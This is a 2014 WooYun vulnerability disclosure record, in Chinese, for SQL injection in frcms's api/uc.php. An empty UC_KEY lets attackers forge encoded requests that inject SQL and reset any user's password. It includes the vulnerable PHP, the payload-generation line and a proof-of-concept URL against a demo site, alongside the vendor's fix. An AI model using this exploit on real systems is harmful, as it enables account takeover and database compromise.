{"id": 51823, "wybug_id": "wooyun-2014-073251", "wybug_title": "frcms 注入 (可改任意用户密码 demo成功)#1", "wybug_corp": "finereason.com", "wybug_author": "′king", "wybug_date": "2014-08-21 13:57", "wybug_open_date": "2014-11-19 13:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-19：\t细节向公众公开  简要描述： rt。 详细说明：  在api/uc.php中\ndefine('API_RETURN_FORBIDDEN', '-2');define('UC_CLIENT_ROOT', FR_ROOT.'/uc_client');include_once(FR_ROOT.'/api/api_config.php');if(defined('IN_UC')) {\texit('Invalid Request');} else {\terror_reporting(0);\tset_magic_quotes_runtime(0);    !isset($db)&&$db=connectdb();\tdefined('MAGIC_QUOTES_GPC') || define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());\t$get = $post = array();\t$code = @$_GET['code'];\t\tparse_str(_authcode($code, 'DECODE', UC_KEY), $get);\tif(MAGIC_QUOTES_GPC) {\t\t$get = _stripslashes($get);\t}\n来看看所包含的这文件。\ndefine('FR_API','');//是否开启整合，空为不整合，pw为整合phpwind，uc为整合Ucenter//此文件中的注释字符不可删除if(FR_API&&FR_API=='uc'){/*uc_config 开始*/define('UC_CONNECT', 'mysql');define('UC_DBHOST', 'localhost');define('UC_DBUSER', 'root');define('UC_DBPW', '123456');define('UC_DBNAME', 'ucenter');define('UC_DBCHARSET', 'gbk');define('UC_DBTABLEPRE', 'uc_');define('UC_DBCONNECT', '0');define('UC_KEY', 'dfdfdfsdfdsfdsd');define('UC_API', 'http://192.168.1.200/uc');define('UC_CHARSET', 'gbk');define('UC_IP', '');define('UC_APPID', '1');define('UC_PPP', '20');/*uc_config 结束*/if(!defined('UC_CLIENT_VERSION')){    @include_once(FR_ROOT.'/uc_client/client.php');}}elseif(FR_API&&FR_API=='pw'){define('P_W','admincp');require_once(FR_ROOT.'/api/pw_api/security.php');require_once(FR_ROOT.'/api/pw_api/pw_common.php');/*pw_config 开始*/define('UC_DBHOST', 'localhost');define('UC_DBUSER', 'root');define('UC_DBPW', '123456');define('UC_DBNAME', 'phpwind');define('UC_DBCHARSET', 'gbk');define('UC_DBTABLEPRE', 'pw_');define('UC_DBCONNECT', '0');define('UC_KEY', '1u0ckr7zbyl58xqwljrq');define('UC_API', 'http://192.168.1.200');define('UC_CHARSET', 'gbk');define('UC_IP', '');define('UC_APPID', '2');/*pw_config 结束*/$uc_appid=UC_APPID;$uc_key=UC_KEY;\n这里一开始define('FR_API','') 为空然后肯定就不能进入那两个if就没有赋值\nparse_str(_authcode($code, 'DECODE', UC_KEY), $get);\tif(MAGIC_QUOTES_GPC) {\t\t$get = _stripslashes($get);\t}\n那么这个UC_KEY 就是UC_KEY 就可以调用一个函数来生成语句了。随便找一个函数。\nfunction updatepw($get, $post) {\t\tglobal $db;\t\tif(!API_UPDATEPW) {\t\t\treturn API_RETURN_FORBIDDEN;\t\t}\t\t$username = $get['username'];        $password = $get['password'];        $newpw = md5($password);\t\t$db->query(\"UPDATE \".$this->tablepre.\"member SET m_pwd='$newpw' WHERE m_login='$username'\");\t\treturn API_RETURN_SUCCEED;\t}\n这里用户名和密码都是我们生成的语句所传递进来的 所以我们可以update任意会员的密码 。当然也可以注入。\n$code=urlencode(_authcode(\"time=999999999999999999999999&username=aaaa'&action=updatepw\", 'ENCODE', $uc_key));\techo $code;exit;\n这里我调用函数生成一下加密字符串得到ece1D670hYzmEkiFD%2FnY%2Fm5PqCzmA99OphcKcW5cb4dL3AzW%2BL73lRDDdNngdeYQnYzE6wYCC4WoIef2%2FKhd08acKElW30X4jIyIuyW3jUPADDbfsdnCcqE\n\n可以看到报错了 成功引入了单引号。如果这里我们生成语句的时候 把用户名和密码改一下 就可以改任意用户的密码了。测试一下demohttp://v2014.rccms.com/api/uc.php?code=e209ygVWvjwOg2ruKoPLOsY4PmxKnRndC73%2BVooImrexNhWivklLwRzSB011MsqX5CzUzxQa2beOvkmPXY0WW63US8VJal8MxDkMvVum5KtY1KvpZYnf6wKd28M1fg\n\n可以看到报错了 自然也就是引入单引号了。   漏洞证明：  http://v2014.rccms.com/api/uc.php?code=e209ygVWvjwOg2ruKoPLOsY4PmxKnRndC73%2BVooImrexNhWivklLwRzSB011MsqX5CzUzxQa2beOvkmPXY0WW63US8VJal8MxDkMvVum5KtY1KvpZYnf6wKd28M1fg\n\n   修复方案：  应该判断是否初始化了uckey如果没有初始化 就exit   版权声明：转载请注明来源 ′king@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-08-25 12:13 厂商回复： 漏洞确认存在，已修复，随后补丁包中更新。感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}